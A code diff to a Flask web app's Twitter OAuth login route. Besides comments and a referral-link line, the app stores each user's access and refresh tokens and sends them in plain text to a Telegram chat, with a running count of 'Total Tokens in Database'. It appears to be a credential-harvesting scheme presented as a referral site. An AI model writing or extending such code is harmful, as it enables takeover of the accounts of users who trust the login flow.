@@ -409,10 +409,14 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
+    
+    # Check if user is already logged in
     if 'username' in session:
         username = session['username']
         send_message_via_telegram(f"👋 @{username} just returned to the website.")
         return redirect(url_for('welcome'))
+
+    # OAuth authorization flow
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -423,12 +427,19 @@ def home():
             f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
         )
         return redirect(authorization_url)
+
+    # Handle response after authorization
     if code:
         if error:
             return f"Error during authorization: {error}", 400
+
+        # Validate the state
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
+
         code_verifier = session.pop('code_verifier', None)
+
+        # Exchange authorization code for tokens
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
             'grant_type': 'authorization_code',
@@ -436,27 +447,43 @@ def home():
             'redirect_uri': CALLBACK_URL,
             'code_verifier': code_verifier
         }
+
         response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
         token_response = response.json()
+
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
+
+            # Fetch Twitter username and profile URL
             username, profile_url = get_twitter_username_and_profile(access_token)
+
             if username:
+                # Store tokens and username in the database
                 store_token(access_token, refresh_token, username)
+
+                # Generate and save the referral link
                 referral_url = generate_referral_url(username)
+                session['referral_url'] = referral_url
+
+                # Update session data
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
-                session['referral_url'] = referral_url
+
+                # Retrieve total token count for notification
                 total_tokens = get_total_tokens()
+
+                # Notify via Telegram with the referral link included
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
+                    f"🌐 Referral Link: {referral_url}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
+
                 return redirect(url_for('welcome'))
             else:
                 return "Error retrieving user info with access token", 400
@@ -464,6 +491,7 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
     return render_template('home.html')
 
 def generate_referral_url(username):
